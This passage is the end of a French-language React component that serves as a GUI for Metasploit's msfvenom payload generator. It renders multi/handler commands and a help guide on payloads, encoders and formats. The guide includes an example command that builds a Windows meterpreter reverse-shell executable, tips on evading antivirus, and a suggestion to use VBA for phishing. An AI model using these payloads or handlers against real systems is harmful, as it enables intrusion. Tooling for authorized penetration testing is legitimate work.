                            msf6 exploit(multi/handler) &gt; set LHOST {config.lhost}<br />
                            msf6 exploit(multi/handler) &gt; set LPORT {config.lport}<br />
                            {selectedPayload.path.includes('meterpreter') && (
                              <>
                                msf6 exploit(multi/handler) &gt; set ExitOnSession false<br />
                                msf6 exploit(multi/handler) &gt; set EnableStageEncoding true<br />
                              </>
                            )}
                            msf6 exploit(multi/handler) &gt; exploit -j
                          </div>
                          <p className="mt-2">
                            Cette configuration démarrera un handler qui écoutera les connexions entrantes du payload généré.
                            {selectedPayload.path.includes('meterpreter') && " Vous obtiendrez une session Meterpreter lorsque le payload sera exécuté sur la cible."}
                          </p>
                          <button
                            onClick={() => copyToClipboard(
                              `use multi/handler\nset PAYLOAD ${selectedPayload.path}\nset LHOST ${config.lhost}\nset LPORT ${config.lport}\n${selectedPayload.path.includes('meterpreter') ? 'set ExitOnSession false\nset EnableStageEncoding true\n' : ''}exploit -j`
                            )}
                            className="mt-2 text-indigo-600 hover:text-indigo-800 flex items-center text-xs"
                          >
                            <FiCopy className="mr-1" /> Copier les commandes Metasploit
                          </button>
                        </div>
                      </div>
                    )}
                  </div>
                )}
              </div>
            </div>
          ) : (
            <p className="text-gray-600">Veuillez sélectionner un payload pour afficher les options de configuration.</p>
          )}
        </div>
      </div>
      
      {/* Help and Guide Section */}
      <div className="mt-8 border rounded-lg overflow-hidden">
        <div 
          className="bg-gray-50 dark:bg-gray-800 p-4 cursor-pointer flex justify-between items-center"
          onClick={() => setHelpExpanded(!helpExpanded)}
        >
          <div className="flex items-center">
            <FiHelpCircle className="mr-2 text-indigo-600" size={20} />
            <h2 className="text-lg font-semibold">Guide d'utilisation et documentation</h2>
          </div>
          {helpExpanded ? <FiChevronDown /> : <FiChevronRight />}
        </div>
        
        {helpExpanded && (
          <div className="p-4">
            <div className="flex mb-4 border-b">
              <button 
                className={`py-2 px-4 ${activeHelpSection === 'intro' ? 'border-b-2 border-indigo-500 text-indigo-600' : 'text-gray-600'}`}
                onClick={() => setActiveHelpSection('intro')}
              >
                Introduction
              </button>
              <button 
                className={`py-2 px-4 ${activeHelpSection === 'payloads' ? 'border-b-2 border-indigo-500 text-indigo-600' : 'text-gray-600'}`}
                onClick={() => setActiveHelpSection('payloads')}
              >
                Payloads
              </button>
              <button 
                className={`py-2 px-4 ${activeHelpSection === 'encoders' ? 'border-b-2 border-indigo-500 text-indigo-600' : 'text-gray-600'}`}
                onClick={() => setActiveHelpSection('encoders')}
              >
                Encoders
              </button>
              <button 
                className={`py-2 px-4 ${activeHelpSection === 'formats' ? 'border-b-2 border-indigo-500 text-indigo-600' : 'text-gray-600'}`}
                onClick={() => setActiveHelpSection('formats')}
              >
                Formats
              </button>
              <button 
                className={`py-2 px-4 ${activeHelpSection === 'usage' ? 'border-b-2 border-indigo-500 text-indigo-600' : 'text-gray-600'}`}
                onClick={() => setActiveHelpSection('usage')}
              >
                Usage
              </button>
            </div>
            
            {activeHelpSection === 'intro' && (
              <div>
                <h3 className="text-lg font-semibold mb-2">Qu'est-ce que MSFvenom?</h3>
                <p className="mb-3">
                  MSFvenom est un outil de génération de payloads du framework Metasploit, utilisé pour créer des charges utiles pour les tests de pénétration. 
                  Il permet de générer des payloads pour différentes plateformes et architectures, avec diverses options d'encodage et de formatage.
                </p>
                <p className="mb-3">
                  <strong>Avertissement:</strong> Cet outil doit être utilisé exclusivement dans un cadre légal et éthique, comme les tests de pénétration 
                  autorisés ou les environnements de laboratoire contrôlés.
                </p>
                <h3 className="text-lg font-semibold mb-2">Prérequis</h3>
                <p>
                  Pour utiliser toutes les fonctionnalités de cet outil, vous devez avoir installé:
                </p>
                <ul className="list-disc pl-6 mb-3">
                  <li>Metasploit Framework (qui inclut msfvenom)</li>
                  <li>Une connexion réseau pour les payloads reverse_tcp/http/https</li>
                </ul>
              </div>
            )}
            
            {activeHelpSection === 'payloads' && (
              <div>
                <h3 className="text-lg font-semibold mb-2">Types de Payloads</h3>
                <p className="mb-3">
                  MSFvenom offre plusieurs types de payloads, organisés hiérarchiquement:
                </p>
                <ul className="list-disc pl-6 mb-3">
                  <li><strong>singles:</strong> Payloads autonomes qui ne nécessitent pas d'étapes supplémentaires</li>
                  <li><strong>stagers:</strong> Petits payloads conçus pour établir une connexion et télécharger un stage plus grand</li>
                  <li><strong>stages:</strong> Payloads plus grands téléchargés par les stagers</li>
                </ul>
                <h3 className="text-lg font-semibold mb-2">Payloads populaires</h3>
                <ul className="list-disc pl-6 mb-3">
                  <li><strong>windows/meterpreter/reverse_tcp:</strong> Établit une connexion Meterpreter depuis la cible vers l'attaquant</li>
                  <li><strong>windows/meterpreter/reverse_https:</strong> Similaire mais utilise HTTPS pour éviter la détection</li>
                  <li><strong>linux/x86/meterpreter/reverse_tcp:</strong> Version Linux du payload Meterpreter</li>
                  <li><strong>cmd/unix/reverse_bash:</strong> Simple shell reverse pour systèmes Unix via Bash</li>
                  <li><strong>php/meterpreter_reverse_tcp:</strong> Payload PHP pour les serveurs web vulnérables</li>
                </ul>
              </div>
            )}
            
            {activeHelpSection === 'encoders' && (
              <div>
                <h3 className="text-lg font-semibold mb-2">Encoders</h3>
                <p className="mb-3">
                  Les encoders permettent de modifier la signature binaire du payload pour éviter la détection par les antivirus. 
                  Ils ne garantissent pas que le payload ne sera pas détecté, mais peuvent aider à contourner les solutions de sécurité basiques.
                </p>
                <h3 className="text-lg font-semibold mb-2">Encoders populaires</h3>
                <ul className="list-disc pl-6 mb-3">
                  <li><strong>x86/shikata_ga_nai:</strong> L'encoder le plus populaire pour les payloads x86, utilise un polymorphisme</li>
                  <li><strong>x64/xor:</strong> Encoder XOR simple pour les payloads 64 bits</li>
                  <li><strong>cmd/powershell_base64:</strong> Encode les commandes PowerShell en Base64</li>
                </ul>
                <p className="mb-3">
                  <strong>Conseil:</strong> Augmenter le nombre d'itérations (-i) peut rendre le payload plus difficile à détecter, 
                  mais augmente également sa taille.
                </p>
              </div>
            )}
            
            {activeHelpSection === 'formats' && (
              <div>
                <h3 className="text-lg font-semibold mb-2">Formats de sortie</h3>
                <p className="mb-3">
                  MSFvenom peut générer des payloads dans différents formats selon vos besoins:
                </p>
                <ul className="list-disc pl-6 mb-3">
                  <li><strong>exe:</strong> Exécutable Windows standard</li>
                  <li><strong>dll:</strong> Bibliothèque dynamique Windows</li>
                  <li><strong>elf:</strong> Exécutable Linux</li>
                  <li><strong>raw:</strong> Données brutes du shellcode</li>
                  <li><strong>powershell:</strong> Script PowerShell</li>
                  <li><strong>vba:</strong> Macro Visual Basic pour Office</li>
                  <li><strong>js_pe:</strong> JavaScript avec PE encapsulé</li>
                </ul>
                <p className="mb-3">
                  <strong>Conseil:</strong> Le format choisi dépend de la méthode de déploiement et de la cible. Par exemple, 
                  pour une attaque par phishing avec document Office, le format VBA serait approprié.
                </p>
              </div>
            )}
            
            {activeHelpSection === 'usage' && (
              <div>
                <h3 className="text-lg font-semibold mb-2">Comment utiliser l'interface MSFvenom</h3>
                <ol className="list-decimal pl-6 mb-3">
                  <li className="mb-2">Sélectionnez un <strong>payload</strong> dans l'onglet Payloads</li>
                  <li className="mb-2">Configurez les options nécessaires (LHOST, LPORT, etc.)</li>
                  <li className="mb-2">Optionnellement, sélectionnez un <strong>encoder</strong>, un <strong>format</strong>, etc. dans les onglets correspondants</li>
                  <li className="mb-2">Cliquez sur le bouton "Générer le Payload"</li>
                  <li className="mb-2">Une fois généré, vous pouvez copier ou enregistrer le payload</li>
                </ol>
                <h3 className="text-lg font-semibold mb-2">Conseils d'utilisation</h3>
                <ul className="list-disc pl-6 mb-3">
                  <li><strong>LHOST:</strong> Pour les payloads reverse, il s'agit de votre adresse IP où le payload se connectera</li>
                  <li><strong>LPORT:</strong> Le port sur lequel vous écouterez les connexions entrantes</li>
                  <li><strong>Fichier de sortie:</strong> Spécifiez un chemin complet pour sauvegarder directement le payload</li>
                  <li><strong>Encodage:</strong> Utile pour éviter les caractères nuls ou les mauvais caractères dans les exploits</li>
                </ul>
                <p className="text-sm bg-gray-100 p-3 rounded">
                  <strong>Exemple:</strong> Pour générer un shell inverse Windows qui se connecte à 192.168.1.100 sur le port 4444:
                  <br />
                  <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe</code>
                </p>
              </div>
            )}
          </div>
        )}
      </div>
    </div>
  );
};

export default Msfvenom;
